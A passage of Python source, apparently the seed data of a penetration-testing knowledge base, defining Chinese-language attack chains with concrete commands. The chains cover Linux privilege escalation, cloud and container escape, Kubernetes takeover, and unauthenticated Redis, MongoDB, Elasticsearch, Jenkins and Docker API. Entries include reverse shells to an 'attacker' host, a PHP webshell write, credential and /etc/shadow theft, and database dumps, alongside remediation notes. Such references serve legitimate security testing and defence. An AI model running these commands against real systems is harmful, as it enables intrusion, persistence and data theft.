            tags=["kerberos", "asrep_roasting", "kerberoasting", "domain", "privilege_escalation", "dcsync"]
        )

        self._add_chain(
            name="Linux提权到root",
            description="从普通用户权限开始，通过内核漏洞/配置错误/SUID等方式提升到root",
            category="internal",
            severity="high",
            prerequisites=["已获得Linux机器普通用户权限", "存在可利用的提权漏洞或配置错误"],
            target_types=["Linux服务器", "Linux工作站"],
            mitre_phases=["执行", "发现", "权限提升", "持久化"],
            estimated_time="30分钟-2小时",
            success_rate="中等（取决于系统配置和补丁状态）",
            detection_difficulty="中等（异常进程和权限变更可检测）",
            remediation="及时安装安全补丁，最小化SUID程序，限制sudo权限，启用审计日志",
            steps=[
                AttackStep(1, "系统信息收集", "收集系统版本、内核、用户、服务等信息", "T1082", ["LinEnum", "linux-exploit-suggester"], ["uname -a", "cat /etc/os-release", "id", "sudo -l"], "获得系统基本信息", ["内核版本", "发行版", "用户组"], ["命令被限制", "信息不足"]),
                AttackStep(2, "枚举SUID/SGID程序", "查找设置了SUID/SGID的程序", "T1548", ["find", "GTFOBins"], ["find / -perm -4000 -type f 2>/dev/null", "find / -perm -2000 -type f 2>/dev/null"], "发现可利用的SUID程序", ["SUID程序列表", "可利用的程序"], ["无SUID程序", "程序不可利用"]),
                AttackStep(3, "检查sudo权限", "查看当前用户可使用sudo执行的命令", "T1548", ["sudo"], ["sudo -l", "sudo -n -l"], "发现可利用的sudo命令", ["可sudo执行的命令列表", "NOPASSWD命令"], ["无sudo权限", "命令不可利用"]),
                AttackStep(4, "检查计划任务和服务", "查找可写的计划任务脚本和服务配置", "T1053", ["crontab", "systemctl"], ["crontab -l", "ls -la /etc/cron.d/", "systemctl list-units --type=service"], "发现可利用的计划任务/服务", ["可写的脚本", "以root运行的任务"], ["无可写脚本", "权限正确"]),
                AttackStep(5, "查找内核漏洞", "使用工具查找可利用的内核漏洞", "T1068", ["linux-exploit-suggester", "searchsploit"], ["linux-exploit-suggester.sh", "searchsploit linux kernel 4.4"], "找到可用的内核提权漏洞", ["漏洞列表", "可用exploit"], ["内核已补丁", "无可用漏洞"]),
                AttackStep(6, "利用漏洞/配置错误提权", "利用找到的漏洞或配置错误提升到root", "T1068", ["自定义exploit", "GTFOBins"], ["编译并运行内核exploit", "利用SUID程序执行命令", "利用sudo NOPASSWD命令"], "获得root权限", ["id显示uid=0(root)", "root shell"], ["利用失败", "系统崩溃"]),
                AttackStep(7, "持久化", "设置SSH公钥/cron任务/rootkit等持久化", "T1543", ["ssh", "cron"], ["echo 'ssh-rsa ...' >> /root/.ssh/authorized_keys", "添加root cron任务"], "获得持久化root访问", ["SSH公钥添加成功", "cron任务添加成功"], ["检测到异常", "权限被撤销"]),
            ],
            tags=["linux", "privilege_escalation", "suid", "sudo", "kernel_exploit", "persistence"]
        )

        # ===== 云安全攻击链（3个） =====
        self._add_chain(
            name="AWS S3配置错误到数据泄露",
            description="从S3存储桶配置错误开始，读取敏感数据，进一步访问AWS账户",
            category="cloud",
            severity="critical",
            prerequisites=["S3存储桶配置错误（公开可读写）", "存储桶包含敏感数据"],
            target_types=["AWS S3存储桶", "云存储"],
            mitre_phases=["发现", "收集", "凭据访问", "数据外泄", "权限提升"],
            estimated_time="30分钟-1小时",
            success_rate="高（配置错误常见）",
            detection_difficulty="低（异常S3访问可通过CloudTrail检测）",
            remediation="启用S3阻止公开访问，最小权限IAM策略，启用S3服务器端加密，监控CloudTrail",
            steps=[
                AttackStep(1, "枚举S3存储桶", "通过字典/OSINT枚举目标的S3存储桶", "T1526", ["s3scanner", "bucket-stream"], ["s3scanner -d domains.txt", "bucket-stream domains.txt"], "发现目标S3存储桶", ["存储桶列表", "公开存储桶"], ["存储桶命名不可猜", "全部私有"]),
                AttackStep(2, "测试存储桶权限", "测试存储桶是否公开可读/可写", "T1526", ["aws cli", "curl"], ["aws s3 ls s3://bucket --no-sign-request", "curl http://bucket.s3.amazonaws.com/"], "发现公开可访问的存储桶", ["列出对象成功", "公开可读/可写"], ["访问被拒绝", "私有存储桶"]),
                AttackStep(3, "读取敏感数据", "下载存储桶中的敏感文件", "T1530", ["aws cli", "s3cmd"], ["aws s3 sync s3://bucket ./data --no-sign-request", "下载备份/配置/凭证文件"], "获取敏感数据", ["数据下载成功", "发现凭证/备份"], ["数据加密", "无敏感数据"]),
                AttackStep(4, "查找AWS凭证", "在下载的数据中查找AWS Access Key", "T1552", ["grep", "trufflehog"], ["grep -r 'AKIA' ./data", "trufflehog filesystem ./data"], "获取AWS Access Key", ["AccessKeyId", "SecretAccessKey"], ["无凭证", "凭证已失效"]),
                AttackStep(5, "验证凭证权限", "使用获取的凭证访问AWS API", "T1078", ["aws cli", "Pacu"], ["aws configure set aws_access_key_id KEY", "aws sts get-caller-identity", "aws iam list-attached-user-policies"], "确认凭证有效和权限范围", ["返回用户信息", "权限策略列表"], ["凭证无效", "权限受限"]),
                AttackStep(6, "提升权限和横向移动", "利用IAM配置错误提升权限，访问其他服务", "T1078", ["Pacu", "aws cli"], ["Pacu run iam__privesc_scan", "尝试创建新IAM用户/角色", "访问EC2/RDS/Lambda"], "获得更高权限和更多数据", ["权限提升成功", "访问更多服务"], ["权限最小化", "检测到异常"]),
                AttackStep(7, "数据外泄和持久化", "窃取大量数据，创建持久化访问", "T1005", ["aws cli"], ["aws s3 sync s3://sensitive-bucket ./exfil", "创建新IAM用户/Access Key"], "完成数据窃取和持久化", ["数据下载完成", "持久化凭证创建"], ["数据加密", "流量检测"]),
            ],
            tags=["aws", "s3", "cloud", "misconfiguration", "data_exfiltration", "iam", "privilege_escalation"]
        )

        self._add_chain(
            name="容器逃逸到宿主机",
            description="从容器内权限开始，通过容器配置错误/漏洞逃逸到宿主机",
            category="cloud",
            severity="critical",
            prerequisites=["已获得容器内权限", "容器存在配置错误（特权模式/挂载/漏洞）"],
            target_types=["Docker容器", "Kubernetes Pod", "容器化应用"],
            mitre_phases=["执行", "发现", "权限提升", "持久化"],
            estimated_time="30分钟-1小时",
            success_rate="中等（取决于容器配置）",
            detection_difficulty="中等（异常容器行为和宿主机访问可检测）",
            remediation="禁止特权容器，最小化挂载，使用非root用户，启用seccomp/AppArmor，更新容器运行时",
            steps=[
                AttackStep(1, "容器内信息收集", "收集容器配置、挂载、权限等信息", "T1082", ["自定义"], ["cat /proc/1/cgroup", "mount", "id", "capsh --print"], "获得容器配置信息", ["cgroup信息", "挂载列表", "capabilities"], ["信息不足", "限制严格"]),
                AttackStep(2, "检查特权模式和危险挂载", "检查是否为特权容器，是否挂载了危险目录", "T1611", ["自定义"], ["检查是否有CAP_SYS_ADMIN", "检查是否挂载了/var/run/docker.sock", "检查是否挂载了宿主机根目录"], "发现可利用的配置错误", ["特权容器", "docker.sock挂载", "宿主机目录挂载"], ["非特权容器", "无危险挂载"]),
                AttackStep(3, "利用docker.sock逃逸", "通过挂载的docker.sock创建特权容器", "T1611", ["docker"], ["docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host"], "逃逸到宿主机", ["宿主机shell", "root权限"], ["无docker.sock", "docker不可用"]),
                AttackStep(4, "利用特权容器逃逸", "通过特权容器的CAP_SYS_ADMIN挂载宿主机磁盘", "T1611", ["mount", "fdisk"], ["fdisk -l", "mount /dev/sda1 /mnt", "chroot /mnt"], "逃逸到宿主机", ["挂载宿主机磁盘", "chroot成功"], ["非特权容器", "无磁盘设备"]),
                AttackStep(5, "利用内核漏洞逃逸", "使用容器逃逸漏洞（如Dirty COW、CVE-2019-5736）", "T1068", ["自定义exploit"], ["编译并运行容器逃逸exploit", "CVE-2019-5736 runc逃逸"], "逃逸到宿主机", ["宿主机shell", "root权限"], ["内核已补丁", "利用失败"]),
                AttackStep(6, "宿主机信息收集和横向移动", "在宿主机上收集信息，访问其他容器/服务", "T1082", ["自定义"], ["查看宿主机进程/网络/文件", "访问其他容器", "查看Kubernetes配置"], "获得宿主机和集群信息", ["宿主机信息", "其他容器访问", "K8s凭证"], ["权限受限", "检测到异常"]),
                AttackStep(7, "持久化", "在宿主机设置持久化后门", "T1543", ["cron", "ssh"], ["添加SSH公钥", "添加cron任务", "创建systemd服务"], "获得持久化宿主机访问", ["SSH公钥添加", "cron任务添加"], ["检测到异常", "权限被撤销"]),
            ],
            tags=["container", "docker", "kubernetes", "container_escape", "privilege_escalation", "cloud"]
        )

        self._add_chain(
            name="Kubernetes攻击链",
            description="从Kubernetes Pod权限开始，通过配置错误逐步控制整个集群",
            category="cloud",
            severity="critical",
            prerequisites=["已获得K8s Pod内权限", "K8s集群存在配置错误"],
            target_types=["Kubernetes集群", "容器化应用"],
            mitre_phases=["发现", "凭据访问", "权限提升", "横向移动", "数据外泄"],
            estimated_time="1-2小时",
            success_rate="中等（取决于K8s配置）",
            detection_difficulty="中等（异常K8s API调用可检测）",
            remediation="最小权限RBAC，禁用默认ServiceAccount挂载，启用NetworkPolicy，使用Pod Security Standards，审计K8s API",
            steps=[
                AttackStep(1, "Pod内信息收集", "收集Pod信息、ServiceAccount token、K8s API地址", "T1613", ["kubectl", "curl"], ["cat /var/run/secrets/kubernetes.io/serviceaccount/token", "env | grep KUBERNETES", "kubectl get pods"], "获得K8s API访问凭证", ["SA token", "API地址", "kubectl可用"], ["SA未挂载", "权限不足"]),
                AttackStep(2, "枚举K8s资源", "使用SA token枚举命名空间、Pod、Secret、ConfigMap", "T1613", ["kubectl", "curl"], ["kubectl get namespaces", "kubectl get pods --all-namespaces", "kubectl get secrets --all-namespaces"], "获得集群资源信息", ["命名空间列表", "Pod列表", "Secret列表"], ["RBAC限制", "权限不足"]),
                AttackStep(3, "读取敏感Secret", "读取K8s Secret中的敏感数据（密码/密钥/凭证）", "T1552", ["kubectl"], ["kubectl get secret <name> -o yaml", "kubectl get secret <name> -o jsonpath='{.data}' | base64 -d"], "获取敏感凭证", ["数据库密码", "API密钥", "云凭证"], ["Secret加密", "无权限"]),
                AttackStep(4, "检查RBAC权限", "检查当前SA的权限，寻找权限提升路径", "T1613", ["kubectl", "peirates"], ["kubectl auth can-i --list", "kubectl get clusterrolebindings", "peirates -interactive"], "发现权限提升路径", ["可创建Pod/Deployment", "可访问其他命名空间", "集群管理员权限"], ["权限最小化", "无提权路径"]),
                AttackStep(5, "创建特权Pod逃逸", "利用创建Pod权限创建特权容器逃逸到节点", "T1611", ["kubectl"], ["kubectl apply -f privileged-pod.yaml", "kubectl exec -it privileged-pod -- chroot /host"], "逃逸到K8s节点", ["节点shell", "root权限"], ["Pod Security限制", "NetworkPolicy阻止"]),
                AttackStep(6, "获取节点凭证和横向移动", "在节点上获取kubelet凭证，访问其他节点", "T1078", ["自定义"], ["读取/var/lib/kubelet/kubeconfig", "使用kubelet API访问其他节点", "读取/etc/kubernetes/admin.conf"], "获得集群管理员权限", ["kubeconfig", "集群管理员凭证", "其他节点访问"], ["凭证加密", "权限不足"]),
                AttackStep(7, "控制整个集群和数据外泄", "使用集群管理员权限控制所有资源，窃取数据", "T1005", ["kubectl"], ["kubectl get secrets --all-namespaces -o yaml", "kubectl exec -it <db-pod> -- dump database", "创建持久化后门Pod"], "完全控制集群和数据", ["所有Secret导出", "数据库备份", "持久化访问"], ["审计检测", "数据加密"]),
            ],
            tags=["kubernetes", "k8s", "container", "rbac", "privilege_escalation", "cluster_admin", "cloud"]
        )

        # ===== 其他攻击链（6个） =====
        self._add_chain(
            name="API安全测试完整流程",
            description="从API发现到漏洞利用的完整API安全测试流程",
            category="web",
            severity="high",
            prerequisites=["目标有API接口", "API文档可获取或可枚举"],
            target_types=["REST API", "GraphQL API", "微服务API"],
            mitre_phases=["发现", "初始访问", "执行", "凭据访问", "数据外泄"],
            estimated_time="2-4小时",
            success_rate="高（API安全问题常见）",
            detection_difficulty="中等（异常API调用可检测）",
            remediation="API认证授权，输入验证，速率限制，API网关，安全编码",
            steps=[
                AttackStep(1, "API发现和文档收集", "发现API端点，收集API文档（Swagger/OpenAPI）", "T1595", ["Burp Suite", "kiterunner", "gau"], ["gau target.com | grep /api/", "kiterunner scan target.com", "访问/swagger /v2/api-docs /openapi.json"], "获得API端点列表和文档", ["API端点列表", "Swagger文档", "OpenAPI规范"], ["无API文档", "API隐藏"]),
                AttackStep(2, "认证和授权测试", "测试API认证机制和授权（IDOR/BOLA）", "T1078", ["Burp Suite", "Postman"], ["测试未认证访问", "修改用户ID测试IDOR", "测试垂直越权"], "发现认证/授权漏洞", ["未认证访问成功", "IDOR越权", "权限提升"], ["认证正确", "授权验证严格"]),
                AttackStep(3, "注入漏洞测试", "测试SQL注入/NoSQL注入/命令注入/SSRF", "T1190", ["sqlmap", "Burp Suite"], ["sqlmap -u 'http://api/users?id=1'", "测试NoSQL注入", "测试SSRF"], "发现注入漏洞", ["SQL注入成功", "NoSQL注入", "SSRF"], ["输入验证正确", "WAF拦截"]),
                AttackStep(4, "批量赋值和 mass assignment", "测试批量赋值漏洞（修改is_admin/role等）", "T1574", ["Burp Suite"], ["在注册/更新请求中添加is_admin=true", "添加role=admin参数"], "发现批量赋值漏洞", ["获得管理员权限", "角色修改成功"], ["字段白名单", "自动绑定禁用"]),
                AttackStep(5, "GraphQL安全测试", "测试GraphQL内省、深度查询、批量查询", "T1595", ["GraphQL Voyager", "InQL"], ["启用内省查看schema", "测试深度查询DoS", "测试批量查询"], "发现GraphQL漏洞", ["schema泄露", "深度查询DoS", "批量查询"], ["内省禁用", "查询深度限制"]),
                AttackStep(6, "API速率限制和业务逻辑测试", "测试速率限制、竞态条件、支付逻辑", "T1499", ["Burp Intruder", "自定义脚本"], ["暴力破解测试速率限制", "并发请求测试竞态条件", "测试支付/优惠券逻辑"], "发现业务逻辑漏洞", ["速率限制缺失", "竞态条件", "支付逻辑绕过"], ["速率限制正确", "事务处理正确"]),
                AttackStep(7, "数据窃取和权限提升", "利用发现的漏洞窃取数据，提升权限", "T1005", ["自定义脚本"], ["通过SQL注入导出数据库", "通过IDOR批量下载用户数据", "通过批量赋值获得管理员权限"], "获得敏感数据和高权限", ["数据库导出", "用户数据下载", "管理员权限"], ["数据加密", "权限最小化"]),
            ],
            tags=["api", "rest", "graphql", "idor", "sql_injection", "mass_assignment", "business_logic"]
        )

        self._add_chain(
            name="Redis未授权到服务器控制",
            description="从Redis未授权访问开始，写入SSH公钥/计划任务/Webshell，最终控制服务器",
            category="internal",
            severity="critical",
            prerequisites=["Redis开放6379端口", "Redis未设置密码", "Redis以root或高权限运行"],
            target_types=["Redis服务器", "缓存服务"],
            mitre_phases=["发现", "初始访问", "执行", "持久化", "权限提升"],
            estimated_time="30分钟-1小时",
            success_rate="高（未授权Redis常见）",
            detection_difficulty="低（异常Redis命令和文件写入可检测）",
            remediation="设置Redis密码，绑定127.0.0.1，禁用CONFIG命令，使用非root用户运行，防火墙限制6379端口",
            steps=[
                AttackStep(1, "扫描Redis未授权", "扫描目标6379端口，测试未授权访问", "T1046", ["nmap", "redis-cli"], ["nmap -p6379 target", "redis-cli -h target info"], "确认Redis未授权访问", ["info命令返回信息", "未设置密码"], ["端口关闭", "设置了密码"]),
                AttackStep(2, "信息收集", "收集Redis配置、数据、系统信息", "T1082", ["redis-cli"], ["redis-cli -h target config get dir", "redis-cli -h target config get dbfilename", "redis-cli -h target keys *"], "获得Redis配置和数据", ["dir路径", "dbfilename", "现有key"], ["权限不足", "CONFIG禁用"]),
                AttackStep(3, "写入SSH公钥", "将SSH公钥写入Redis，保存到authorized_keys", "T1098", ["redis-cli", "ssh-keygen"], ["(echo -e '\\n\\n'; cat id_rsa.pub; echo -e '\\n\\n') | redis-cli -h target -x set crackit", "redis-cli -h target config set dir /root/.ssh/", "redis-cli -h target config set dbfilename authorized_keys", "redis-cli -h target save"], "SSH公钥写入成功", ["authorized_keys生成", "SSH登录成功"], ["目录不可写", "非root运行"]),
                AttackStep(4, "写入计划任务", "通过Redis写入cron任务获取反弹shell", "T1053", ["redis-cli", "nc"], ["redis-cli -h target set xxx '\\n\\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\\n\\n'", "redis-cli -h target config set dir /var/spool/cron/", "redis-cli -h target config set dbfilename root", "redis-cli -h target save"], "计划任务写入成功", ["cron任务执行", "反弹shell连接"], ["cron目录不可写", "路径不同"]),
                AttackStep(5, "写入Webshell", "通过Redis写入Webshell到Web目录", "T1505", ["redis-cli"], ["redis-cli -h target set '<?php system($_GET[cmd]);?>' shell.php", "redis-cli -h target config set dir /var/www/html/", "redis-cli -h target config set dbfilename shell.php", "redis-cli -h target save"], "Webshell写入成功", ["Webshell可访问", "命令执行成功"], ["Web目录不可写", "脚本不执行"]),
                AttackStep(6, "主从复制RCE", "利用Redis主从复制加载恶意模块执行命令", "T1203", ["redis-rogue-server"], ["redis-rogue-server.py --rhost target --rport 6379 --lhost attacker --lport 6379"], "获得命令执行权限", ["命令执行输出", "id命令结果"], ["Redis版本已修复", "模块加载禁用"]),
                AttackStep(7, "权限提升和持久化", "提升到root权限，设置持久化访问", "T1068", ["linux-exploit-suggester"], ["查找并利用提权漏洞", "添加SSH公钥/cron任务持久化"], "获得root权限和持久化", ["id显示root", "持久化成功"], ["无提权漏洞", "安全配置"]),
            ],
            tags=["redis", "unauthorized", "ssh", "cron", "webshell", "rce", "privilege_escalation"]
        )

        self._add_chain(
            name="MongoDB未授权到数据泄露",
            description="从MongoDB未授权访问开始，读取数据库，获取敏感数据",
            category="internal",
            severity="high",
            prerequisites=["MongoDB开放27017端口", "MongoDB未设置认证"],
            target_types=["MongoDB数据库", "NoSQL数据库"],
            mitre_phases=["发现", "收集", "数据外泄"],
            estimated_time="30分钟-1小时",
            success_rate="高（未授权MongoDB常见）",
            detection_difficulty="低（异常MongoDB连接和数据导出可检测）",
            remediation="启用MongoDB认证，绑定127.0.0.1，启用TLS，防火墙限制27017端口，最小权限用户",
            steps=[
                AttackStep(1, "扫描MongoDB未授权", "扫描目标27017端口，测试未授权访问", "T1046", ["nmap", "mongo"], ["nmap -p27017 target", "mongo target --eval 'db.version()'"], "确认MongoDB未授权访问", ["版本信息返回", "未设置认证"], ["端口关闭", "设置了认证"]),
                AttackStep(2, "枚举数据库", "列出所有数据库和集合", "T1082", ["mongo", "mongosh"], ["mongo target --eval 'db.adminCommand({listDatabases:1})'", "mongo target --eval 'db.getCollectionNames()'"], "获得数据库和集合列表", ["数据库列表", "集合列表"], ["权限不足", "空数据库"]),
                AttackStep(3, "读取敏感数据", "读取用户表、凭证表、配置表等敏感数据", "T1005", ["mongo", "mongodump"], ["mongo target --eval 'db.users.find().toArray()'", "mongo target --eval 'db.config.find().toArray()'"], "获取敏感数据", ["用户凭证", "API密钥", "配置信息"], ["数据加密", "集合为空"]),
                AttackStep(4, "导出整个数据库", "使用mongodump导出所有数据库", "T1005", ["mongodump"], ["mongodump --host target --out ./mongo_dump"], "完成数据库导出", ["所有数据库导出", "数据文件"], ["网络限制", "数据量大"]),
                AttackStep(5, "查找管理员凭证", "在导出的数据中查找管理员账户和密码", "T1003", ["grep", "jq"], ["grep -r 'admin' ./mongo_dump", "grep -r 'password' ./mongo_dump", "grep -r 'secret' ./mongo_dump"], "获取管理员凭证", ["管理员账户", "密码哈希", "API密钥"], ["密码加密", "无管理员账户"]),
                AttackStep(6, "破解密码哈希", "使用Hashcat破解获取的密码哈希", "T1110", ["hashcat"], ["hashcat -m 0 hashes.txt rockyou.txt (MD5)", "hashcat -m 3200 hashes.txt rockyou.txt (bcrypt)"], "破解出用户密码", ["明文密码", "管理员密码"], ["密码强度高", "破解失败"]),
                AttackStep(7, "利用凭证横向移动", "使用获取的凭证登录其他系统/应用", "T1078", ["curl", "浏览器"], ["使用管理员凭证登录Web应用", "使用SSH凭证登录服务器", "使用API密钥访问云服务"], "获得更多系统访问权限", ["Web应用管理员", "服务器shell", "云服务访问"], ["凭证无效", "MFA拦截"]),
            ],
            tags=["mongodb", "nosql", "unauthorized", "data_exfiltration", "credential_theft", "lateral_movement"]
        )

        self._add_chain(
            name="Elasticsearch未授权到数据泄露",
            description="从Elasticsearch未授权访问开始，读取索引，获取敏感数据",
            category="internal",
            severity="high",
            prerequisites=["Elasticsearch开放9200端口", "Elasticsearch未设置认证"],
            target_types=["Elasticsearch搜索引擎", "日志分析平台"],
            mitre_phases=["发现", "收集", "数据外泄"],
            estimated_time="30分钟-1小时",
            success_rate="高（未授权ES常见）",
            detection_difficulty="低（异常ES查询和数据导出可检测）",
            remediation="启用Elasticsearch安全认证，绑定127.0.0.1，启用TLS，防火墙限制9200端口，最小权限用户",
            steps=[
                AttackStep(1, "扫描Elasticsearch未授权", "扫描目标9200端口，测试未授权访问", "T1046", ["nmap", "curl"], ["nmap -p9200 target", "curl http://target:9200/"], "确认Elasticsearch未授权访问", ["版本信息返回", "集群名称"], ["端口关闭", "设置了认证"]),
                AttackStep(2, "枚举索引", "列出所有索引和映射", "T1082", ["curl", "ElasticHD"], ["curl http://target:9200/_cat/indices?v", "curl http://target:9200/_mapping?pretty"], "获得索引列表和字段映射", ["索引列表", "字段映射", "文档数量"], ["权限不足", "空索引"]),
                AttackStep(3, "读取敏感索引", "读取用户、日志、配置等敏感索引的数据", "T1005", ["curl"], ["curl http://target:9200/users/_search?size=1000", "curl http://target:9200/logs/_search?size=1000"], "获取敏感数据", ["用户数据", "日志数据", "配置信息"], ["数据加密", "索引为空"]),
                AttackStep(4, "导出所有数据", "使用scroll API或elasticdump导出所有索引", "T1005", ["elasticdump", "curl"], ["elasticdump --input=http://target:9200 --output=./es_dump --all"], "完成数据导出", ["所有索引导出", "数据文件"], ["网络限制", "数据量大"]),
                AttackStep(5, "查找敏感信息", "在导出的数据中查找凭证、API密钥、个人信息", "T1003", ["grep", "jq"], ["grep -r 'password' ./es_dump", "grep -r 'api_key' ./es_dump", "grep -r 'email' ./es_dump"], "获取敏感信息", ["密码哈希", "API密钥", "用户PII"], ["数据加密", "无敏感信息"]),
                AttackStep(6, "利用集群API", "利用Elasticsearch集群API执行脚本或修改配置", "T1203", ["curl"], ["curl -X POST http://target:9200/_scripts/test -H 'Content-Type: application/json' -d '{\"script\":{\"lang\":\"painless\",\"source\":\"...\"}}'", "测试Groovy脚本执行（旧版本）"], "可能获得命令执行", ["脚本执行成功", "命令输出"], ["版本已修复", "脚本禁用"]),
                AttackStep(7, "横向移动和持久化", "利用获取的凭证访问其他系统，设置持久化", "T1078", ["curl", "ssh"], ["使用获取的凭证登录Kibana/其他系统", "使用SSH凭证登录服务器"], "获得更多系统访问权限", ["Kibana管理员", "服务器shell"], ["凭证无效", "MFA拦截"]),
            ],
            tags=["elasticsearch", "unauthorized", "data_exfiltration", "credential_theft", "lateral_movement"]
        )

        self._add_chain(
            name="Jenkins未授权到RCE",
            description="从Jenkins未授权访问开始，利用脚本控制台执行命令，最终控制服务器",
            category="internal",
            severity="critical",
            prerequisites=["Jenkins开放8080端口", "Jenkins未设置认证或存在弱口令", "脚本控制台可访问"],
            target_types=["Jenkins CI/CD服务器", "持续集成平台"],
            mitre_phases=["发现", "初始访问", "执行", "持久化", "权限提升"],
            estimated_time="30分钟-1小时",
            success_rate="高（未授权Jenkins常见）",
            detection_difficulty="中等（异常Jenkins任务和进程可检测）",
            remediation="启用Jenkins认证，禁用匿名访问，限制脚本控制台，使用非root用户运行，防火墙限制8080端口",
            steps=[
                AttackStep(1, "扫描Jenkins未授权", "扫描目标8080端口，测试未授权访问", "T1046", ["nmap", "curl"], ["nmap -p8080 target", "curl http://target:8080/"], "确认Jenkins未授权访问", ["Jenkins页面", "未登录可访问"], ["端口关闭", "设置了认证"]),
                AttackStep(2, "信息收集", "收集Jenkins版本、插件、任务、节点信息", "T1082", ["curl", "Jenkins CLI"], ["curl http://target:8080/api/json?pretty=true", "curl http://target:8080/pluginManager/api/json?depth=1"], "获得Jenkins信息", ["版本号", "插件列表", "任务列表"], ["权限不足", "API禁用"]),
                AttackStep(3, "访问脚本控制台", "访问Jenkins脚本控制台（Groovy）", "T1059", ["浏览器", "curl"], ["访问 http://target:8080/script", "访问 http://target:8080/scriptText"], "脚本控制台可访问", ["脚本输入框", "执行按钮"], ["需要认证", "脚本控制台禁用"]),
                AttackStep(4, "执行Groovy脚本RCE", "在脚本控制台执行Groovy代码获取命令执行", "T1203", ["Groovy"], ["println 'id'.execute().text", "println 'whoami'.execute().text", "def cmd = 'bash -i >& /dev/tcp/attacker/4444 0>&1'.execute()"], "获得命令执行权限", ["命令执行输出", "id/whoami结果", "反弹shell连接"], ["脚本执行被限制", "沙箱拦截"]),
                AttackStep(5, "创建持久化任务", "创建Jenkins任务设置定时执行，持久化访问", "T1053", ["curl", "Jenkins API"], ["通过API创建定时任务", "任务中执行反弹shell命令"], "获得持久化访问", ["任务创建成功", "定时执行成功"], ["任务被删除", "权限不足"]),
                AttackStep(6, "读取凭证和密钥", "读取Jenkins存储的凭证、API密钥、SSH密钥", "T1003", ["Groovy"], ["println hudson.util.Secret.decrypt(credentials.password)", "读取credentials.xml", "读取SSH私钥"], "获取敏感凭证", ["数据库密码", "API密钥", "SSH私钥"], ["凭证加密", "权限不足"]),
                AttackStep(7, "权限提升和横向移动", "利用获取的凭证和服务器权限提升、横向移动", "T1068", ["linux-exploit-suggester", "ssh"], ["查找并利用提权漏洞", "使用SSH密钥登录其他服务器", "访问代码仓库"], "获得更高权限和更多系统访问", ["root权限", "其他服务器访问", "代码仓库访问"], ["无提权漏洞", "网络隔离"]),
            ],
            tags=["jenkins", "unauthorized", "groovy", "rce", "credential_theft", "persistence", "lateral_movement"]
        )

        self._add_chain(
            name="Docker API未授权到容器逃逸",
            description="从Docker API未授权访问开始，创建特权容器，逃逸到宿主机",
            category="cloud",
            severity="critical",
            prerequisites=["Docker API开放2375端口", "Docker API未设置认证/TLS"],
            target_types=["Docker服务器", "容器主机"],
            mitre_phases=["发现", "初始访问", "执行", "权限提升", "持久化"],
            estimated_time="30分钟-1小时",
            success_rate="高（未授权Docker API常见）",
            detection_difficulty="中等（异常容器创建和特权容器可检测）",
            remediation="启用Docker API TLS认证，绑定127.0.0.1，防火墙限制2375端口，禁用特权容器，使用rootless Docker",
            steps=[
                AttackStep(1, "扫描Docker API未授权", "扫描目标2375端口，测试未授权访问", "T1046", ["nmap", "curl"], ["nmap -p2375 target", "curl http://target:2375/version"], "确认Docker API未授权访问", ["Docker版本信息", "API可访问"], ["端口关闭", "设置了TLS"]),
                AttackStep(2, "信息收集", "收集容器、镜像、网络、卷信息", "T1082", ["curl", "docker"], ["curl http://target:2375/containers/json", "curl http://target:2375/images/json", "curl http://target:2375/volumes"], "获得Docker信息", ["容器列表", "镜像列表", "卷列表"], ["权限不足", "API禁用"]),
                AttackStep(3, "在现有容器中执行命令", "使用Docker API在运行中的容器内执行命令", "T1059", ["curl"], ["curl -X POST http://target:2375/containers/<id>/exec -H 'Content-Type: application/json' -d '{\"Cmd\":[\"id\"]}'", "curl -X POST http://target:2375/exec/<id>/start -H 'Content-Type: application/json' -d '{\"Detach\":false}'"], "在容器中执行命令", ["命令执行输出", "容器内信息"], ["容器不存在", "exec被禁用"]),
                AttackStep(4, "创建特权容器逃逸", "创建挂载宿主机根目录的特权容器，逃逸到宿主机", "T1611", ["curl"], ["curl -X POST http://target:2375/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/host\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}'", "curl -X POST http://target:2375/containers/<id>/start"], "逃逸到宿主机", ["宿主机shell", "root权限"], ["特权容器禁用", "AppArmor限制"]),
                AttackStep(5, "读取宿主机敏感文件", "在特权容器中读取宿主机敏感文件", "T1005", ["cat", "curl"], ["cat /host/etc/passwd", "cat /host/etc/shadow", "cat /host/root/.ssh/id_rsa", "cat /host/var/lib/docker/secrets"], "获取宿主机敏感数据", ["用户哈希", "SSH私钥", "Docker密钥"], ["文件不可读", "加密存储"]),
                AttackStep(6, "宿主机持久化", "在宿主机设置SSH公钥/cron任务/systemd服务持久化", "T1543", ["echo", "systemctl"], ["echo 'ssh-rsa ...' >> /host/root/.ssh/authorized_keys", "echo '* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1' >> /host/var/spool/cron/root", "创建systemd服务"], "获得宿主机持久化访问", ["SSH公钥添加", "cron任务添加", "systemd服务创建"], ["检测到异常", "权限被撤销"]),
                AttackStep(7, "横向移动和权限提升", "利用宿主机权限和凭证横向移动到其他主机/集群", "T1078", ["ssh", "kubectl"], ["使用SSH密钥登录其他主机", "读取Kubernetes配置访问集群", "查找并利用提权漏洞"], "控制更多主机和集群", ["其他主机shell", "K8s集群访问", "root权限"], ["网络隔离", "凭证无效"]),
            ],
            tags=["docker", "unauthorized", "container_escape", "privilege_escalation", "persistence", "lateral_movement", "cloud"]
        )

        self._save_chains()
        log.info(f"初始化完成，共 {len(self.chains)} 个攻击链")

    # ===== 查询方法 =====
    def get_chain(self, chain_id: str) -> Optional[Dict[str, Any]]:
        """获取攻击链详情"""
        chain = self.chains.get(chain_id)
        return chain.to_dict() if chain else None

    def search_chains(self, category: str = None, severity: str = None,
                      keyword: str = None, tags: List[str] = None) -> List[Dict[str, Any]]:
        """搜索攻击链"""
        results = []
        for chain in self.chains.values():
            if category and chain.category != category:
                continue
            if severity and chain.severity != severity:
                continue
            if keyword and keyword.lower() not in (chain.name + chain.description).lower():
                continue
            if tags and not any(t in chain.tags for t in tags):
                continue
            results.append(chain.to_dict())
        results.sort(key=lambda x: x["severity"])
        return results

    def get_chains_by_category(self, category: str) -> List[Dict[str, Any]]:
        """按类别获取攻击链"""
        return self.search_chains(category=category)

    def get_statistics(self) -> Dict[str, Any]:
        """获取统计信息"""
        by_category = Counter(c.category for c in self.chains.values())
        by_severity = Counter(c.severity for c in self.chains.values())
        all_tags = []
        for c in self.chains.values():
